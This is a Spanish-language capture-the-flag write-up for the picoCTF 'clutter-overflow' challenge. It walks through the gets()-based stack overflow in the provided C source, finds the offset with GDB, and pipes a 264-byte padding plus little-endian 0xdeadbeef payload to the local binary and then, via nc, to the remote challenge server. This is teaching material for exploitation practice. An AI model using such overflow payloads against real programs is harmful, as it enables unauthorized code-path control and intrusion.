# clutter-overflow

## Descripción: 
Clutter, clutter everywhere and not a byte to use.`nc mars.picoctf.net 31890`

---
CHALLENGE ENDPOINTS
Download chall.c [chall.c](https://artifacts.picoctf.net/picoMini+by+redpwn/Binary+Exploitation/clutter-overflow/chall.c)

Download chall [chall](https://artifacts.picoctf.net/picoMini+by+redpwn/Binary+Exploitation/clutter-overflow/chall)

**Pistas:**
**Sin Pistas** 

## Solución:
1. En ese reto se nos da un binario de 64 bits llamado `chall`:

```txt
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000) 
```

2. También tenemos el código fuente C. Básicamente, lo que hace el programa es llamar a la función  `gets` y luego comparar una variable local (`code`) con el valor de una variable global (`GOAL`):

```c
#include <stdio.h>
#include <stdlib.h>

#define SIZE 0x100
#define GOAL 0xdeadbeef

const char* HEADER = 
" ______________________________________________________________________\n"
"|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|\n"
"| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |\n"
"|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|\n"
"| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \\^ ^ |\n"
"|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \\ ^ _ ^ / |                | \\^ ^|\n"
"| ^/_\\^ ^ ^ /_________\\^ ^ ^ /_\\ | //  | /_\\ ^| |   ____  ____   | | ^ |\n"
"|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|\n"
"| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |\n"
"|^ ^ ^ ^ ^| /     (   \\ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \\|^ ^|\n"
".-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |\n"
"|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\\ |^ ^|\n"
"| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |\n"
"|'.____'_^||/!\\@@@@@/!\\|| _'______________.'|==                    =====\n"
"|\\|______|===============|________________|/|\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n"
"\" ||\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"  \n"
"\"\"''\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n"
"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n"
"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"";

int main(void)
{
  long code = 0;
  char clutter[SIZE];

  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);
 
  puts(HEADER); 
  puts("My room is so cluttered...");
  puts("What do you see?");

  gets(clutter);


  if (code == GOAL) {
    printf("code == 0x%llx: how did that happen??\n", GOAL);
    puts("take a flag for your troubles");
    system("cat flag.txt");
  } else {
    printf("code == 0x%llx\n", code);
    printf("code != 0x%llx :(\n", GOAL);
  }

  return 0;
}

```

3. La idea es simple: `gets` es vulnerable al desbordamiento de búfer, por lo que podemos escribir valores en la pila. De esa forma, podemos sobrescribir el valor del `code` de la variable: Vamos a depurarlo con `GDB`:

```bash
┌──(kali㉿kali)-[~/picoCTF-Practice/binaryExploitation/clutter-overflow]
└─$ gdb -q chall
Reading symbols from chall...
(No debugging symbols found in chall)
(gdb) disassemble main
Dump of assembler code for function main:
   0x00000000004006c7 <+0>:     push   %rbp
   0x00000000004006c8 <+1>:     mov    %rsp,%rbp
   0x00000000004006cb <+4>:     sub    $0x110,%rsp
   0x00000000004006d2 <+11>:    movq   $0x0,-0x8(%rbp)
   0x00000000004006da <+19>:    mov    0x20197f(%rip),%rax        # 0x602060 <stdout@@GLIBC_2.2.5>
   0x00000000004006e1 <+26>:    mov    $0x0,%esi
   0x00000000004006e6 <+31>:    mov    %rax,%rdi
   0x00000000004006e9 <+34>:    call   0x4005a0 <setbuf@plt>
   0x00000000004006ee <+39>:    mov    0x20197b(%rip),%rax        # 0x602070 <stdin@@GLIBC_2.2.5>
   0x00000000004006f5 <+46>:    mov    $0x0,%esi
   0x00000000004006fa <+51>:    mov    %rax,%rdi
   0x00000000004006fd <+54>:    call   0x4005a0 <setbuf@plt>
   0x0000000000400702 <+59>:    mov    0x201977(%rip),%rax        # 0x602080 <stderr@@GLIBC_2.2.5>
   0x0000000000400709 <+66>:    mov    $0x0,%esi
   0x000000000040070e <+71>:    mov    %rax,%rdi
   0x0000000000400711 <+74>:    call   0x4005a0 <setbuf@plt>
   0x0000000000400716 <+79>:    mov    0x201933(%rip),%rax        # 0x602050 <HEADER>
   0x000000000040071d <+86>:    mov    %rax,%rdi
   0x0000000000400720 <+89>:    call   0x400590 <puts@plt>
   0x0000000000400725 <+94>:    lea    0x69d(%rip),%rdi        # 0x400dc9
   0x000000000040072c <+101>:   call   0x400590 <puts@plt>
   0x0000000000400731 <+106>:   lea    0x6ac(%rip),%rdi        # 0x400de4
   0x0000000000400738 <+113>:   call   0x400590 <puts@plt>
   0x000000000040073d <+118>:   lea    -0x110(%rbp),%rax
   0x0000000000400744 <+125>:   mov    %rax,%rdi
   0x0000000000400747 <+128>:   mov    $0x0,%eax
--Type <RET> for more, q to quit, c to continue without paging--
   0x000000000040074c <+133>:   call   0x4005d0 <gets@plt>
   0x0000000000400751 <+138>:   mov    $0xdeadbeef,%eax
   0x0000000000400756 <+143>:   cmp    %rax,-0x8(%rbp)
   0x000000000040075a <+147>:   jne    0x40078c <main+197>
   0x000000000040075c <+149>:   mov    $0xdeadbeef,%esi
   0x0000000000400761 <+154>:   lea    0x690(%rip),%rdi        # 0x400df8
   0x0000000000400768 <+161>:   mov    $0x0,%eax
   0x000000000040076d <+166>:   call   0x4005c0 <printf@plt>
   0x0000000000400772 <+171>:   lea    0x6a6(%rip),%rdi        # 0x400e1f
   0x0000000000400779 <+178>:   call   0x400590 <puts@plt>
   0x000000000040077e <+183>:   lea    0x6b8(%rip),%rdi        # 0x400e3d
   0x0000000000400785 <+190>:   call   0x4005b0 <system@plt>
   0x000000000040078a <+195>:   jmp    0x4007ba <main+243>
   0x000000000040078c <+197>:   mov    -0x8(%rbp),%rax
   0x0000000000400790 <+201>:   mov    %rax,%rsi
   0x0000000000400793 <+204>:   lea    0x6b0(%rip),%rdi        # 0x400e4a
   0x000000000040079a <+211>:   mov    $0x0,%eax
   0x000000000040079f <+216>:   call   0x4005c0 <printf@plt>
   0x00000000004007a4 <+221>:   mov    $0xdeadbeef,%esi
   0x00000000004007a9 <+226>:   lea    0x6aa(%rip),%rdi        # 0x400e5a
   0x00000000004007b0 <+233>:   mov    $0x0,%eax
   0x00000000004007b5 <+238>:   call   0x4005c0 <printf@plt>
   0x00000000004007ba <+243>:   mov    $0x0,%eax
   0x00000000004007bf <+248>:   leave
   0x00000000004007c0 <+249>:   ret
End of assembler dump.
(gdb) 
```

4. Vemos que el `code` de la variable local está almacenado en `$rbp - 0x8`. Entonces, encontremos el desplazamiento para alcanzar el registro `$rbp` usando una cadena de patrón. Debemos usar una cadena de más de 256 bytes (`0x100`), que es la longitud del búfer que se muestra en el código fuente:

```bash
gef➤  pattern create 300
[+] Generating a pattern of 300 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaa  
aauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa
[+] Saved as '$_gef0'
gef➤  run
Starting program: ./chall
My room is so cluttered...
What do you see?
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaa
aauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa
code == 0x6261616161616169
code != 0xdeadbeef :(

Program received signal SIGSEGV, Segmentation fault.
0x00000000004007c0 in main ()
```

```bash
gef➤  pattern offset $rbp
[+] Searching for '$rbp'
[+] Found at offset 272 (little-endian search) likely  
```

5. Perfecto, necesitamos 272 bytes para controlar `$rbp`. Por lo tanto, necesitamos 264 (272 - 8) para llegar a la variable que queremos modificar. Después de los 264 caracteres, debemos poner `0xdeadbeef` en formato little-endian para pasar la verificación y leer la bandera:

```bash
┌──(kali㉿kali)-[~/picoCTF-Practice/binaryExploitation/clutter-overflow]
└─$ (python3 -c 'import sys; sys.stdout.write("A" * 264)'; echo -e '\xef\xbe\xad\xde') | ./chall  
 ______________________________________________________________________
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \^ ^ |
|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \ ^ _ ^ / |                | \^ ^|
| ^/_\^ ^ ^ /_________\^ ^ ^ /_\ | //  | /_\ ^| |   ____  ____   | | ^ |
|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|
| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |
|^ ^ ^ ^ ^| /     (   \ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \|^ ^|
.-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |
|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\ |^ ^|
| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |
|'.____'_^||/!\@@@@@/!\|| _'______________.'|==                    =====
|\|______|===============|________________|/|""""""""""""""""""""""""""
" ||""""||"""""""""""""""||""""""""""""""||"""""""""""""""""""""""""""""
""''""""''"""""""""""""""''""""""""""""""''""""""""""""""""""""""""""""""
""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
My room is so cluttered...
What do you see?
code == 0xdeadbeef: how did that happen??
take a flag for your troubles
cat: flag.txt: No such file or directory
```

6. Bien, enviemos la carga útil a la instancia remota:

```bash
┌──(kali㉿kali)-[~/picoCTF-Practice/binaryExploitation/clutter-overflow]
└─$ (python3 -c 'import sys; sys.stdout.write("A" * 264)'; echo -e '\xef\xbe\xad\xde') | nc mars.picoctf.net 31890  
 ______________________________________________________________________
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \^ ^ |
|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \ ^ _ ^ / |                | \^ ^|
| ^/_\^ ^ ^ /_________\^ ^ ^ /_\ | //  | /_\ ^| |   ____  ____   | | ^ |
|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|
| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |
|^ ^ ^ ^ ^| /     (   \ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \|^ ^|
.-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |
|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\ |^ ^|
| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |
|'.____'_^||/!\@@@@@/!\|| _'______________.'|==                    =====
|\|______|===============|________________|/|""""""""""""""""""""""""""
" ||""""||"""""""""""""""||""""""""""""""||"""""""""""""""""""""""""""""
""''""""''"""""""""""""""''""""""""""""""''""""""""""""""""""""""""""""""
""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
My room is so cluttered...
What do you see?
code == 0xdeadbeef: how did that happen??
take a flag for your troubles
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}

┌──(kali㉿kali)-[~/picoCTF-Practice/binaryExploitation/clutter-overflow]
└─$ 
```

### Flag: picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}

## Notas adicionales:

## Referencias: